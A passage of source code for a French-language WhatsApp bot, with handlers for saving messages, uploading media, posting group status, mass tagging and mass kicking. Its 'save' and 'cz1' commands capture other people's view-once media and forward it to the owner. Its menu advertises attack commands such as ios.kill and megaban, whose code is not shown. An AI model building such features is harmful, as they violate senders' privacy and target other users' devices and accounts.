            isGroup: (message.key?.remoteJid || '').endsWith('@g.us'),
            quotedMessageKey: {
              id: raw.extendedTextMessage?.contextInfo?.stanzaId || null,
              participant: raw.extendedTextMessage?.contextInfo?.participant || null
            },
            summary: summarizeMessage(quoted)
          };

          const pretty = JSON.stringify(report, null, 2);
          const MAX_LEN = 1500;
          if (pretty.length <= MAX_LEN) {
            await sock.sendMessage(remoteJid, { text: `🔍 Résultat de l'inspection :\n\n${pretty}` }, { quoted: message });
          } else {
            const chunks = [];
            for (let i = 0; i < pretty.length; i += MAX_LEN) chunks.push(pretty.slice(i, i + MAX_LEN));
            await sock.sendMessage(remoteJid, { text: '🔍 Rapport trop long, envoi en plusieurs parties...' }, { quoted: message });
            for (const c of chunks) {
              await sock.sendMessage(remoteJid, { text: '```json\n' + c + '\n```' }, { quoted: message });
            }
          }

        } catch (err) {
          console.error('[DETECT ERROR]', err);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur lors de l'inspection : ${err.message || err}` }, { quoted: message });
        }
        break;
      }

      case 'sauvegarde':
      case 'garder': {
        try {
          const botPrivateJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const quotedSender = message.message?.extendedTextMessage?.contextInfo?.participant || senderJid;
          const senderName = message.pushName || senderJid.split('@')[0];

          if (!quoted) {
            await sock.sendMessage(remoteJid, {
              text: `💾 *Commande SAVE*\n\n📌 *Utilisation:*\nRéponds à n'importe quel message avec \`${config.prefix}save\`\n\n• Texte, image, vidéo, audio, sticker, View Once\n\n✅ Le média sera envoyé en privé sur ton numéro bot`
            }, { quoted: message });
            break;
          }

          await sock.sendMessage(remoteJid, { react: { text: "💾", key: message.key } });

          const fromName = quotedSender?.split('@')[0] || 'Unknown';
          const dateStr  = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Ndjamena' });
          const headerTxt = `💾 *SAUVEGARDÉ*\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 *De:* +${fromName}\n📅 *Date:* ${dateStr}\n💬 *Enregistré par:* ${senderName}\n━━━━━━━━━━━━━━━━━━━━━━━`;

          // Envoyer l'en-tête d'abord
          await sock.sendMessage(botPrivateJid, { text: headerTxt });

          // Détecter et envoyer le type de contenu
          const qViewOnce = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
          const qImg   = qViewOnce?.imageMessage  || quoted.imageMessage;
          const qVid   = qViewOnce?.videoMessage  || quoted.videoMessage;
          const qAud   = quoted.audioMessage;
          const qStick = quoted.stickerMessage;
          const qTxt   = quoted.conversation || quoted.extendedTextMessage?.text;
          const qCaption = qImg?.caption || qVid?.caption || '';

          if (qImg) {
            const stream = await downloadContentFromMessage(qImg, 'image');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              image:   buf,
              mimetype: qImg.mimetype || 'image/jpeg',
              caption: qCaption || '📸 Image sauvegardée'
            });
          } else if (qVid) {
            const stream = await downloadContentFromMessage(qVid, 'video');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              video:   buf,
              mimetype: qVid.mimetype || 'video/mp4',
              caption: qCaption || '🎥 Vidéo sauvegardée'
            });
          } else if (qAud) {
            const stream = await downloadContentFromMessage(qAud, 'audio');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              audio:   buf,
              mimetype: qAud.mimetype || 'audio/ogg',
              ptt:     qAud.ptt || false
            });
          } else if (qStick) {
            const stream = await downloadContentFromMessage(qStick, 'sticker');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, { sticker: buf });
          } else if (qTxt) {
            await sock.sendMessage(botPrivateJid, {
              text: `💬 *Message sauvegardé:*\n\n${qTxt}`
            });
          } else {
            await sock.sendMessage(botPrivateJid, {
              text: '📎 Contenu sauvegardé (type non reconnu)'
            });
          }

          // Juste une réaction ✅, pas de message de confirmation
          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('SAVE ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *Erreur save:* ${e.message}`
          }, { quoted: message });
        }
        break;
      }

      // =============================================
      // 🎭 COMMANDE SETCMD — Transformer une commande en sticker
      // =============================================
      case 'setcmd':
      case 'cmdsticker':
      case 'stickercmd': {
        try {
          const cmdName = args[0]?.toLowerCase();
          if (!cmdName) {
            await sock.sendMessage(remoteJid, {
              text: `🎭 *Commande SETCMD*\n\n📌 *Utilisation:*\n1️⃣ Réponds à un sticker avec:\n   \`${config.prefix}setcmd [commande]\`\n\n📋 *Exemples:*\n• \`${config.prefix}setcmd play\` → ce sticker lancera !play\n• \`${config.prefix}setcmd gpt\` → ce sticker appellera !gpt\n• \`${config.prefix}setcmd vv\` → ce sticker appellera !vv\n\n✅ Envoie ensuite ce sticker pour exécuter la commande`
            }, { quoted: message });
            break;
          }

          // Chercher un sticker en reply
          const quotedStick = message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
          if (!quotedStick) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à un *sticker* avec \`${config.prefix}setcmd ${cmdName}\``
            }, { quoted: message });
            break;
          }

          // Télécharger le sticker
          const stickerStream = await downloadContentFromMessage(quotedStick, 'sticker');
          const stickerBuf    = await toBuffer(stickerStream);

          // Calculer un hash simple du sticker pour l'identifier
          const stickerHash = stickerBuf.slice(0, 32).toString('hex');

          // Sauvegarder dans une Map globale
          if (!global.stickerCommands) global.stickerCommands = new Map();
          global.stickerCommands.set(stickerHash, cmdName);

          await sock.sendMessage(remoteJid, {
            text: `✅ *Sticker configuré!*\n\n🎭 Ce sticker exécutera: \`${config.prefix}${cmdName}\`\n\n📌 Envoie ce sticker dans n'importe quelle conversation pour déclencher la commande.`
          }, { quoted: message });
          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('SETCMD ERROR:', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur setcmd: ${e.message}` }, { quoted: message });
        }
        break;
      }

      case 'pair':
      case 'connect':
      case 'adduser':{
        const pN=args[0]?.replace(/[^0-9]/g,'');
        if(!pN||pN.length<7){await sock.sendMessage(remoteJid,{text:`📱 Usage: ${config.prefix}pair NUMERO`});break;}
        try{const pc=await sock.requestPairingCode(pN);const fc=pc?.match(/.{1,4}/g)?.join('-')||pc;await sock.sendMessage(remoteJid,{text:`🔗 *CODE DE COUPLAGE*\n📱 +${pN}\n🔑 ${fc}\n⏰ Expire dans 60s`});}
        catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
        break;
      }
      case 't':{
        const tEs=['mp4','mov','jpg','jpeg','png','webp','mp3','ogg','txt','js'];
        let tF=null,tE=null;
        for(const e of tEs){const c2=path.resolve(`./t.${e}`);if(fs.existsSync(c2)){tF=c2;tE=e;break;}}
        if(!tF){await sock.sendMessage(remoteJid,{text:'❌ Aucun fichier t.* trouvé.'});break;}
        try{
          if(['mp4','mov'].includes(tE))await sock.sendMessage(remoteJid,{video:fs.readFileSync(tF),mimetype:'video/mp4',caption:''});
          else if(['jpg','jpeg','png','webp'].includes(tE))await sock.sendMessage(remoteJid,{image:fs.readFileSync(tF),caption:''});
          else if(['mp3','ogg'].includes(tE))await sock.sendMessage(remoteJid,{audio:fs.readFileSync(tF),mimetype:'audio/mp4',ptt:false});
          else if(tE==='txt')await sock.sendMessage(remoteJid,{text:fs.readFileSync(tF,'utf8')});
          await sock.sendMessage(remoteJid,{text:`✅ t.${tE} envoyé!`});
        }catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
        break;
      }

      // ══════════════════════════════════════════
      // 📤 TOURL — Convertir média en lien (catbox.moe)
      // Usage: !tourl (répondre à une image ou vidéo)
      // ══════════════════════════════════════════
      case 'tourl': {
        await simulateTyping(sock, remoteJid);
        try {
          // Récupérer le message quoté ou le message actuel
          const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const targetMsg = quotedMsg || message.message;

          // Détecter le type de média
          const imgMsg   = targetMsg?.imageMessage;
          const vidMsg   = targetMsg?.videoMessage;
          const audioMsg = targetMsg?.audioMessage;
          const stickerMsg = targetMsg?.stickerMessage;
          const mediaMsg = imgMsg || vidMsg || audioMsg || stickerMsg;

          if (!mediaMsg) {
            await sock.sendMessage(remoteJid, { text: `❌ Réponds à une image, vidéo ou audio avec *${config.prefix}tourl*` });
            break;
          }

          await sock.sendMessage(remoteJid, { text: '⏳ Upload en cours...' });

          // Télécharger le média
          const mediaType = imgMsg ? 'image' : vidMsg ? 'video' : audioMsg ? 'audio' : 'sticker';
          const msgToDownload = quotedMsg
            ? message.message.extendedTextMessage.contextInfo.quotedMessage
            : message.message;

          const msgKey = imgMsg ? 'imageMessage' : vidMsg ? 'videoMessage' : audioMsg ? 'audioMessage' : 'stickerMessage';
          const stream = await downloadContentFromMessage(
            quotedMsg ? quotedMsg[msgKey] : message.message[msgKey],
            mediaType === 'sticker' ? 'sticker' : mediaType
          );
          const chunks = [];
          for await (const chunk of stream) chunks.push(chunk);
          const buffer = Buffer.concat(chunks);

          // Détecter l'extension
          let ext = 'bin';
          if (imgMsg) ext = 'jpg';
          else if (vidMsg) ext = 'mp4';
          else if (audioMsg) ext = 'mp3';
          else if (stickerMsg) ext = 'webp';

          // Upload sur catbox.moe
          const { default: fetch } = await import('node-fetch');
          const { default: FormData } = await import('form-data');
          const bodyForm = new FormData();
          bodyForm.append('fileToUpload', buffer, 'file.' + ext);
          bodyForm.append('reqtype', 'fileupload');

          const res = await fetch('https://catbox.moe/user/api.php', {
            method: 'POST',
            body: bodyForm,
          });
          const url = await res.text();

          if (!url || url.includes('error') || !url.startsWith('https')) {
            await sock.sendMessage(remoteJid, { text: '❌ Échec de l\'upload. Réessaie.' });
            break;
          }

          await sock.sendMessage(remoteJid, {
            text: `✅ *Upload réussi!*

🔗 *Lien :* ${url}
⏳ *Expiration :* Permanent`,
          }, { quoted: message });

        } catch(e) {
          console.error('[TOURL]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      // ══════════════════════════════════════════
      // 📢 SWGRUP — Envoyer un message au statut du groupe
      // Usage: !swgrup [texte] ou reply image/vidéo/audio
      // ══════════════════════════════════════════
      case 'swgrup': {
        await simulateTyping(sock, remoteJid);
        try {
          // Récupérer le message quoté (chercher dans tous les contextes possibles)
          const _ctxSw = message.message?.extendedTextMessage?.contextInfo
                      || message.message?.imageMessage?.contextInfo
                      || message.message?.videoMessage?.contextInfo
                      || message.message?.audioMessage?.contextInfo;
          const quotedMsgSw = _ctxSw?.quotedMessage;

          // Caption = texte après !swgrup
          const captionSw = messageText.slice(config.prefix.length).replace(/^swgrup\s*/i, '').trim();

          // Détecter le type de média quoté
          const imgMsg2   = quotedMsgSw?.imageMessage;
          const vidMsg2   = quotedMsgSw?.videoMessage;
          const audioMsg2 = quotedMsgSw?.audioMessage;
          const stkMsg2   = quotedMsgSw?.stickerMessage;

          // Bypasser le patch global sendMessage (qui corrompt groupStatusMessage)
          const _send = typeof _origSendMessageGlobal === 'function' ? _origSendMessageGlobal : sock.sendMessage.bind(sock);

          if (imgMsg2) {
            const buf2 = await toBuffer(await downloadContentFromMessage(imgMsg2, 'image'));
            await _send(remoteJid, {
              groupStatusMessage: {
                image: buf2,
                mimetype: imgMsg2.mimetype || 'image/jpeg',
                caption: captionSw
              }
            });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else if (vidMsg2) {
            const buf2 = await toBuffer(await downloadContentFromMessage(vidMsg2, 'video'));
            await _send(remoteJid, {
              groupStatusMessage: {
                video: buf2,
                mimetype: vidMsg2.mimetype || 'video/mp4',
                caption: captionSw
              }
            });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else if (audioMsg2) {
            const buf2 = await toBuffer(await downloadContentFromMessage(audioMsg2, 'audio'));
            await _send(remoteJid, {
              groupStatusMessage: {
                audio: buf2,
                mimetype: audioMsg2.mimetype || 'audio/ogg; codecs=opus',
                ptt: audioMsg2.ptt || false
              }
            });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else if (captionSw) {
            await _send(remoteJid, {
              groupStatusMessage: { text: captionSw }
            });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else {
            await sock.sendMessage(remoteJid, {
              text: `❌ Reply sur une image/vidéo/audio puis tape:\n${config.prefix}swgrup [texte optionnel]`
            });
          }

        } catch(e) {
          console.error('[SWGRUP]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur swgrup: ${e.message}` });
        }
        break;
      }


      // ══════════════════════════════════════════
      // 📤 CZ1 — Envoyer vue unique en PV avec watermark
      // Usage: .cz1 (répondre à une image/vidéo vue unique)
      // ══════════════════════════════════════════
      case 'cz1': {
        await simulateTyping(sock, remoteJid);
        try {
          const quotedCtxCz = message.message?.extendedTextMessage?.contextInfo;
          const quotedMsgCz = quotedCtxCz?.quotedMessage;

          if (!quotedMsgCz) {
            await sock.sendMessage(remoteJid, { text: `❌ Reply à une image ou vidéo avec ${config.prefix}cz1` });
            break;
          }

          const imgCz  = quotedMsgCz?.imageMessage
                      || quotedMsgCz?.viewOnceMessageV2?.message?.imageMessage
                      || quotedMsgCz?.viewOnceMessageV2Extension?.message?.imageMessage;
          const vidCz  = quotedMsgCz?.videoMessage
                      || quotedMsgCz?.viewOnceMessageV2?.message?.videoMessage
                      || quotedMsgCz?.viewOnceMessageV2Extension?.message?.videoMessage;
          const audCz  = quotedMsgCz?.audioMessage;

          // Envoyer au PV du bot (numéro owner)
          const destJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const wmCaption = `ILIM DA INDINA 👽 DEGUINSODOUR DA BESS MA YANFA 😂 🇷🇴`;

          if (imgCz) {
            const buf = await toBuffer(await downloadContentFromMessage(imgCz, 'image'));
            await sock.sendMessage(destJid, { image: buf, caption: wmCaption });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else if (vidCz) {
            const buf = await toBuffer(await downloadContentFromMessage(vidCz, 'video'));
            await sock.sendMessage(destJid, { video: buf, caption: wmCaption });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else if (audCz) {
            const buf = await toBuffer(await downloadContentFromMessage(audCz, 'audio'));
            await sock.sendMessage(destJid, { audio: buf, mimetype: audCz.mimetype || 'audio/ogg', ptt: audCz.ptt || false });
            await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });

          } else {
            await sock.sendMessage(remoteJid, { text: '❌ Reply à une image, vidéo ou audio.' });
          }

        } catch(e) {
          console.error('[CZ1]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }


      case 'restart': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Commande réservée aux admins du bot.' });
          break;
        }
        await sock.sendMessage(remoteJid, { text: '🔄 *Redémarrage du bot...*\n\nÀ dans quelques secondes !' });
        setTimeout(() => process.exit(0), 2000);
        break;
      }

      default:
        await sock.sendMessage(remoteJid, {
          text: `❌ Commande inconnue: ${config.prefix}${command}\n\nType ${config.prefix}help`
        });
    }
  } catch (error) {
    console.error(`❌ Command error [${command}]:`, error?.message || error);
    await sock.sendMessage(remoteJid, { 
      text: `❌ *Command error:* \`${command}\`\n\n\`${error?.message || 'Unknown error'}\`` 
    });
  } finally {
    // Restaurer _currentFromMe après l'exécution de la commande
    _currentFromMe = _origFromMe;
  }
}

// =============================================
// FONCTIONS DES COMMANDES
// =============================================

// ═══════════════════════════════════════════════════
// 🗂️  SYSTÈME MENU COMPLET — SEIGNEUR TD 🇷🇴
// ═══════════════════════════════════════════════════

function buildUptime() {
  const s = Math.floor(process.uptime());
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (d > 0) return `${d} day(s), ${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (h > 0) return `${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (m > 0) return `${m} minute(s), ${sec} second(s)`;
  return `${sec} second(s)`;
}

// ─── DONNÉES COMMUNES DES CATÉGORIES ────────────────────────────────────────
function getMenuCategories(p) {
  return [
    { num: '1', key: 'owner',    icon: '🛡️', label: 'OWNER MENU',      cmds: [`${p}restart`,`${p}mode`,`${p}update`,`${p}updatedev`,`${p}storestatus`,`${p}storesave`,`${p}pp`,`${p}gpp`,`${p}block`,`${p}unblock`,`${p}join`,`${p}autotyping`,`${p}autorecording`,`${p}autoreact`,`${p}antidelete`,`${p}antiedit`,`${p}readstatus`,`${p}chatboton`,`${p}chatbotoff`,`${p}getsettings`,`${p}setstickerpackname`,`${p}setstickerauthor`,`${p}setprefix`,`${p}setbotimg`] },
    { num: '2', key: 'download', icon: '\uD83D\uDCE5', label: 'DOWNLOAD MENU',   cmds: [`${p}play`,`${p}playaudio`,`${p}playvideo`,`${p}playptt`,`${p}tiktok`,`${p}ig`,`${p}ytmp3`,`${p}ytmp4`] },
    { num: '3', key: 'group',    icon: '\uD83D\uDC65', label: 'GROUP MENU',      cmds: [`${p}tagall`,`${p}tagadmins`,`${p}hidetag`,`${p}kickall`,`${p}kickadmins`,`${p}acceptall`,`${p}add`,`${p}kick`,`${p}promote`,`${p}demote`,`${p}mute`,`${p}unmute`,`${p}invite`,`${p}revoke`,`${p}gname`,`${p}gdesc`,`${p}groupinfo`,`${p}welcome`,`${p}goodbye`,`${p}leave`,`${p}listonline`,`${p}listactive`,`${p}listinactive`,`${p}kickinactive`,`${p}groupstatus`,`${p}swgrup`] },
    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: [`${p}antibug`,`${p}antilink`,`${p}antibot`,`${p}antitag`,`${p}antispam`,`${p}antimentiongroupe`,`${p}warn`,`${p}warns`,`${p}resetwarn`,`${p}permaban`,`${p}unpermaban`,`${p}banlist`] },
    { num: '5', key: 'bug',      icon: '🪲', label: 'ATTACK MENU',     cmds: [`${p}kill.gc`,`${p}ios.kill`,`${p}andro.kill`,`${p}silent`,`${p}bansupport`,`${p}megaban`,`${p}checkban`] },
    { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: [`${p}sticker`,`${p}take`,`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}tostatus`,`${p}tourl`,`${p}cz1`] },
    { num: '7', key: 'misc',     icon: '📂', label: 'GENERAL MENU',    cmds: [`${p}ping`,`${p}alive`,`${p}info`,`${p}menu`,`${p}allmenu`,`${p}help`,`${p}repo`,`${p}jid`,`${p}quoted`,`${p}dev`,`${p}bible`,`${p}checkban`,`${p}fancy`,`${p}gpt`,`${p}gemini`,`${p}save`,`${p}setcmd`,`${p}detect`] },
    { num: '8', key: 'image',    icon: '👁️', label: 'VIEW ONCE MENU',  cmds: [`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}vv last`] },
    { num: '9', key: 'games',    icon: '🎮', label: 'GAMES MENU',      cmds: [`${p}tictactoe`,`${p}ttt`,`${p}quizmanga`,`${p}quiz`,`${p}squidgame`,`${p}sg`] },
    { num: '10', key: 'ai',      icon: '🤖', label: 'SEIGNEUR TD AI',   cmds: [`${p}chatbot`,`${p}seigneur`,`${p}td`,`${p}chat`,`${p}chatboton`,`${p}chatbotoff`,`${p}clearchat`,`${p}gpt`,`${p}gemini`] },
  ];
}

// ─── MENU PRINCIPAL (!menu) ──────────────────────────────────────────────────
async function handleMenu(sock, message, remoteJid, senderJid) {
  const p = config.prefix;

  await simulateTyping(sock, remoteJid);
  try { await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } }); } catch(e) {}

  const menuText =
`░▒▓█  𝗟𝗘 𝗦𝗘𝗜𝗚𝗡𝗘𝗨𝗥 🇷🇴  █▓▒░

╭──〔 👑 𝗔𝗗𝗠𝗜𝗡 〕
├ mode
├ update
├ pp
├ gpp
├ block
├ unblock
├ join
├ autotyping
├ autorecording
├ autoreact
├ antidelete
├ antiedit
├ readstatus
├ chatboton
├ chatbotoff
├ getsettings
├ setstickerpackname
├ setstickerauthor
├ setprefix
╰───────────────

╭──〔 📥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 〕
├ play
├ playvideo
├ ytmp3
├ ytmp4
├ tiktok
├ ig
╰───────────────

╭──〔 👥 𝗚𝗥𝗢𝗨𝗣𝗘 〕
├ tagall
├ tagadmins
├ hidetag
├ kickall
├ add
├ kick
├ promote
├ demote
├ mute
├ unmute
├ invite
├ revoke
├ gname
├ gdesc
├ groupinfo
├ welcome
├ goodbye
├ leave
├ swgrup
╰───────────────

╭──〔 🖼 𝗜𝗠𝗔𝗚𝗘 & 𝗧𝗢𝗢𝗟𝗦 〕
├ sticker
├ take
├ vv
├ tostatus
├ tourl
├ cz1
├ ping
├ alive
├ info
├ fancy
├ gpt
├ gemini
├ save
╰───────────────

  © 2026 | 𝗟𝗘 𝗦𝗘𝗜𝗚𝗡𝗘𝗨𝗥`;

  const menuMsg = await sendWithImage(sock, remoteJid, 'menu', menuText, [senderJid]);

  // Sauvegarder le message menu
  if (!global.menuMessages) global.menuMessages = new Map();
  if (menuMsg?.key?.id) {
    global.menuMessages.set(menuMsg.key.id, { remoteJid, senderJid, timestamp: Date.now() });
    for (const [id, data] of global.menuMessages.entries()) {
      if (Date.now() - data.timestamp > 300000) global.menuMessages.delete(id);
    }
  }
}

// ─── ALL MENU (!allmenu / !0) ────────────────────────────────────────────────
async function handleAllMenu(sock, message, remoteJid, senderJid) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);

  await simulateTyping(sock, remoteJid);

  // Construire un seul bloc with toutes les catégories
  const blocks = cats.map(c => {
    const lines = c.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');
    return `┌─「 ${c.icon} *${c.label}* 」\n${lines}\n└──────────────────────`;
  }).join('\n\n');

  const text =
`📋 *𝐀𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 — SEIGNEUR TD 🇷🇴* ☠️
━━━━━━━━━━━━━━━━━━━━━━━━━━

${blocks}

━━━━━━━━━━━━━━━━━━━━━━━━━━
 *㋛ 𝙻𝙾𝚁𝙳 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 〽️𝚇𝙼𝙳* 🇷🇴
 _Type ${p}menu to go back_`;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}

// ─── SOUS-MENU PAR CATÉGORIE (!1–!8 / !ownermenu etc.) ──────────────────────
async function sendSubMenu(sock, message, remoteJid, senderJid, type) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);
  const cat  = cats.find(c => c.key === type);

  if (!cat) {
    await sock.sendMessage(remoteJid, { text: `❌ Category *${type}* not found.` });
    return;
  }

  await simulateTyping(sock, remoteJid);

  const lines = cat.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');

  const text =
`${cat.icon} *${cat.label}*
*╭──────────────────────────*
${lines}
*╰──────────────────────────*

✒️ *Prefix:* ${p}
 _Type ${p}menu to go back_
 *㋛ 𝙻𝙾𝚁𝙳 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 〽️𝚇𝙼𝙳* 🇷🇴`;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}


// TAGALL - Design ultra stylé with système d'information complet
async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const groupName = metadata.subject;
    const participants = metadata.participants;
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    const superAdmin = participants.find(p => p.admin === 'superadmin');
    const memberCount = participants.length;
    const allJids = participants.map(p => p.id);
    const adminJids = admins.map(p => p.id);
    const customMessage = args.join(' ') || '';

    // Nom du superadmin
    const superAdminNum = superAdmin ? '@' + superAdmin.id.split('@')[0] : '@Owner';
    const superAdminMentions = superAdmin ? [superAdmin.id] : [];

    // Liste admins formatée
    let adminList = '';
    admins.forEach((a, i) => {
      adminList += `  ┃ ➥ @${a.id.split('@')[0]}\n`;
    });

    // Liste membres formatée (sans les admins)
    const regularMembers = participants.filter(p => !p.admin);
    let memberList = '';
    regularMembers.forEach((m, i) => {
      memberList += `  ┃🇷🇴 ${(i + 1).toFixed(1)} ✦ @${m.id.split('@')[0]}\n`;
    });

    const tagMessage =
`⌬ ━━━━━━━ 🖥️ ꜱʏꜱᴛᴇᴍ_ʙʀᴏᴀᴅᴄᴀꜱᴛ ━━━━━━━ ⌬

  ✧⚚✧ ɢʀᴏᴜᴘᴇ : 『 ${groupName} 』
  ⚜️ ꜱ-ᴀᴅᴍɪɴ : ♛ ${superAdminNum}

  ╔⟡───────────────────────────⟡╗
  ╠⟡══ 📊 ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ :
  ║⟡  👥 ᴍᴇᴍʙʀᴇꜱ : ${memberCount}
  ╚⟡───────────────────────────⟡╝

${customMessage ? `  📢 ${customMessage}\n` : ''}  ⚡ ɴᴇᴛᴡᴏʀᴋ_ʟᴀʏᴇʀꜱ ⚡

  ⟁ 🛡️ ᴀᴅᴍɪɴ_ʟɪꜱᴛ :
${adminList}  ┃
  ⟁ 👥 ᴍᴇᴍʙʀᴇꜱ_ʟɪꜱᴛ :
${memberList}
  ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
  🜲 ꜱᴛᴀᴛᴜꜱ : ᴄᴏɴɴᴇᴄᴛᴇᴅ | 🇷🇴 ᴏɴʟɪɴᴇ`;

    await sock.sendMessage(remoteJid, {
      text: tagMessage,
      mentions: allJids
    });

    console.log(`✅ TagAll envoyé à ${memberCount} membres dans ${groupName}`);
  } catch (error) {
    console.error('Erreur tagall:', error);
    await sock.sendMessage(remoteJid, { text: '❌ Erreur lors du tag' });
  }
}

// KICKALL - MESSAGE RESTAURÉ with style original
async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdminOrOwner()) {
    await sock.sendMessage(remoteJid, { text: '⛔ Bot admin only command' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const botJid = sock.user.id; // JID complet du bot
    const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Format WhatsApp standard
    
    // Récupérer le nom de l'admin qui lance la commande
    const adminName = metadata.participants.find(p => p.id === senderJid)?.notify || 
                     metadata.participants.find(p => p.id === senderJid)?.verifiedName ||
                     senderJid.split('@')[0];
    
    const normalMembers=metadata.participants.filter(p=>p.id!==botNumber&&!p.admin).map(p=>p.id);
    if(!normalMembers.length){await sock.sendMessage(remoteJid,{text:'⚠️ Aucun membre à expulser.'});return;}

    // =============================================
    // PHASE 1: EXPULSION DES MEMBRES NORMAUX
    // =============================================
    
    await sock.sendMessage(remoteJid, { 
      text: `  🚨 KICK-ALL PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 ÉXÉCUTION EN COURS...
[▓▓▓▓▓░░░░░░░] 40%
> 🎯 Cible : Tous les membres du groupe
> ⚠️ Avertissement : Tous les membres sont en cours d'expulsion par la console.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de SEIGNEUR TD 🇷🇴` 
    });

    await delay(3000);

    const batchSize = 500;
    let kicked = 0;

    // Expulser les membres normaux
    if (normalMembers.length > 0) {
      for (let i = 0; i < normalMembers.length; i += batchSize) {
        const batch = normalMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          kicked += batch.length;
          
          // Calculer le pourcentage (seulement pour les membres normaux)
          const percentage = Math.floor((kicked / normalMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression
          if (i + batchSize < normalMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 ÉXÉCUTION EN COURS...
[${progressBar}] ${percentage}%

> 👤 Expulsé : ${kicked}/${normalMembers.length}
> ⚡ In progress...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error('Erreur kicking batch:', error);
        }
      }

      // Message intermédiaire de succès
      await sock.sendMessage(remoteJid, {
        text: `✅ Phase 1 terminée: ${kicked} membre(s) expulsé(s)

⏳ Initialisation de la phase 2...`
      });
    }

    // =============================================
    // PHASE 2: EXPULSION DES ADMINS (5 SEC PLUS TARD)
    // =============================================
    
    if (adminMembers.length > 0) {
      await delay(5000);

      await sock.sendMessage(remoteJid, {
        text: `  🚨 ADMIN PURGE PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 RÉVOCATION DES DROITS...
[▓▓▓▓▓░░░░░░░] 45%
> 🎯 Cible : Staff & Administrateurs
> ⚠️ Avertissement : Suppression des privilèges
  et expulsion immédiate de la hiérarchie.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de SEIGNEUR TD 🇷🇴`
      });

      await delay(3000);

      let adminKicked = 0;

      // Expulser les admins
